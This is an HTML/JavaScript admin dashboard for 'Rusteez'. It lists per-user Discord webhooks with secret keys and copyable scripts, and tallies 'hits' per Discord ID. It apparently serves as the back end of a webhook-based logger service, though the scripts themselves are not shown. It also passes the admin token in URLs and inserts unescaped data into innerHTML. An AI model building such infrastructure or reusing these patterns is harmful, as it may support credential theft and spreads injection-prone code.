<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rusteez - Admin Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { background-color: #080a11; color: #e2e8f0; font-family: 'Inter', sans-serif; font-size: 11px; }
        .panel { background: #111827; border: 1px solid #1f2937; border-radius: 4px; }
        .tab-btn { border-bottom: 2px solid transparent; transition: all 0.2s; color: #64748b; text-transform: uppercase; font-weight: 900; font-size: 10px; letter-spacing: 0.05em; }
        .tab-btn.active { border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.05); }
        .data-card { background: #111827; border: 1px solid #1f2937; transition: all 0.3s; position: relative; }
        .data-card:hover { border-color: #a855f7; }
        .hidden { display: none; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #374151; }
        input { background: #1f2937 !important; border: 1px solid #374151 !important; color: white !important; }
        
        /* Animation pour le feedback de copie */
        .copy-success { color: #10b981 !important; }
    </style>
</head>
<body class="p-6">

    <div id="login-overlay" class="fixed inset-0 z-50 flex items-center justify-center bg-[#080a11]">
        <div class="panel p-8 w-full max-w-sm text-center shadow-2xl">
            <h1 class="text-xl font-black italic uppercase text-purple-500 mb-6">Rusteez <span class="text-white">Admin</span></h1>
            <input type="password" id="authInput" placeholder="Enter ADMIN_TOKEN..." class="w-full p-3 rounded text-center mb-4 outline-none focus:border-purple-500">
            <button onclick="checkAuth()" class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded font-black uppercase text-[10px] tracking-widest transition-all">Access Dashboard</button>
            <p id="auth-error" class="text-red-500 text-[9px] mt-4 font-bold uppercase hidden italic underline">Invalid Token Access Denied</p>
        </div>
    </div>

    <div id="admin-content" class="hidden max-w-6xl mx-auto">
        <header class="flex justify-between items-center mb-8 bg-slate-900/40 p-5 border border-slate-800 rounded">
            <div>
                <h1 class="text-xl font-black italic uppercase tracking-tighter text-white">Rusteez <span class="text-purple-500">Master</span></h1>
                <p class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Database & Stats Management</p>
            </div>
            <div id="status-badge" class="text-[9px] text-emerald-500 font-black uppercase flex items-center gap-2">
                System Online <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
            </div>
        </header>

        <nav class="flex gap-1 mb-6 border-b border-slate-800">
            <button onclick="switchTab('webhooks')" id="tab-webhooks" class="tab-btn active px-8 py-4">Manage Webhooks</button>
            <button onclick="switchTab('stats')" id="tab-stats" class="tab-btn px-8 py-4">User Statistics</button>
        </nav>

        <section id="content-webhooks" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></section>

        <section id="content-stats" class="hidden">
            <div class="panel overflow-hidden">
                <table class="w-full text-left border-collapse">
                    <thead class="bg-black/40 border-b border-slate-800 uppercase text-[9px] text-slate-500 font-black">
                        <tr>
                            <th class="p-4">User</th>
                            <th class="p-4">Discord ID</th>
                            <th class="p-4 text-center">Total Hits</th>
                            <th class="p-4 text-right">Last Activity</th>
                        </tr>
                    </thead>
                    <tbody id="stats-table-body" class="text-[10px]"></tbody>
                </table>
            </div>
        </section>
    </div>

    <script>
        let GLOBAL_TOKEN = "";

        async function checkAuth() {
            const input = document.getElementById('authInput').value;
            try {
                const res = await fetch(`/api/admin/verify?token=${input}`);
                const data = await res.json();
                if (data.success) {
                    GLOBAL_TOKEN = input;
                    document.getElementById('login-overlay').classList.add('hidden');
                    document.getElementById('admin-content').classList.remove('hidden');
                    loadWebhooks();
                } else { throw new Error(); }
            } catch {
                document.getElementById('auth-error').classList.remove('hidden');
            }
        }

        function switchTab(name) {
            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('content-' + name).classList.remove('hidden');
            document.getElementById('tab-' + name).classList.add('active');
            
            if(name === 'webhooks') loadWebhooks();
            if(name === 'stats') loadStats();
        }

        // --- GESTION DES WEBHOOKS ---
        async function loadWebhooks() {
            const res = await fetch(`/api/admin/webhooks?token=${GLOBAL_TOKEN}`);
            const data = await res.json();
            const container = document.getElementById('content-webhooks');
            
            container.innerHTML = data.map(wh => {
                // On encode le script pour éviter les erreurs de syntaxe JS dans le onclick
                const encodedScript = encodeURIComponent(wh.script || "-- No script found");
                
                return `
                <div class="data-card p-4 rounded shadow-lg border-l-4 border-l-purple-600">
                    <div class="flex justify-between items-start mb-4">
                        <div>
                            <h4 class="text-white font-black text-xs uppercase tracking-tight">@${wh.userName}</h4>
                            <span class="text-[8px] text-slate-500 font-mono italic">ID: ${wh.userId}</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="copyScript(this, \`${encodedScript}\`)" class="text-purple-400 hover:text-purple-300 p-1 transition-colors" title="Copy Script">
                                <i class="fas fa-code"></i>
                            </button>
                            <button onclick="deleteWebhook('${wh._id}')" class="text-red-500 hover:text-red-400 p-1 transition-colors">
                                <i class="fas fa-trash-alt"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div class="space-y-2">
                        <div class="bg-black/30 p-2 rounded border border-slate-800">
                            <p class="text-[7px] text-slate-500 uppercase font-bold mb-1">Webhook Secret Key</p>
                            <p class="text-purple-400 font-mono text-[9px] break-all">${wh.webhookId}</p>
                        </div>
                        <div class="bg-black/30 p-2 rounded border border-slate-800">
                            <p class="text-[7px] text-slate-500 uppercase font-bold mb-1">Target Webhook URL</p>
                            <p class="text-emerald-500 font-mono text-[8px] truncate">${wh.url}</p>
                        </div>
                    </div>
                </div>
            `}).join('');
        }

        async function deleteWebhook(id) {
            if(!confirm("⚠️ Delete this user access?")) return;
            await fetch(`/api/admin/webhooks/${id}?token=${GLOBAL_TOKEN}`, { method: 'DELETE' });
            loadWebhooks();
        }

        function copyScript(btn, encodedScript) {
            const script = decodeURIComponent(encodedScript);
            const icon = btn.querySelector('i');
            
            navigator.clipboard.writeText(script).then(() => {
                // Feedback visuel rapide
                const originalClass = icon.className;
                icon.className = "fas fa-check copy-success";
                setTimeout(() => { icon.className = originalClass; }, 1500);
            }).catch(err => {
                alert("Error copying script");
            });
        }

        // --- GESTION DES STATISTIQUES (HITS) ---
        async function loadStats() {
            const res = await fetch(`/api/admin/hits-summary?token=${GLOBAL_TOKEN}`);
            const data = await res.json();
            const tbody = document.getElementById('stats-table-body');
            
            tbody.innerHTML = data.map(user => `
                <tr class="border-b border-slate-800/50 hover:bg-white/[0.02] transition-colors">
                    <td class="p-4 font-black text-purple-400 uppercase italic underline underline-offset-4">@${user.userName}</td>
                    <td class="p-4 font-mono text-slate-500">${user._id}</td>
                    <td class="p-4 text-center">
                        <span class="bg-purple-500/10 text-purple-400 px-3 py-1 rounded-full font-black border border-purple-500/20">
                            ${user.totalHits} HITS
                        </span>
                    </td>
                    <td class="p-4 text-right text-slate-600 font-bold uppercase text-[8px]">
                        ${new Date(user.lastHit).toLocaleString()}
                    </td>
                </tr>
            `).join('');
        }
    </script>
</body>
</html>
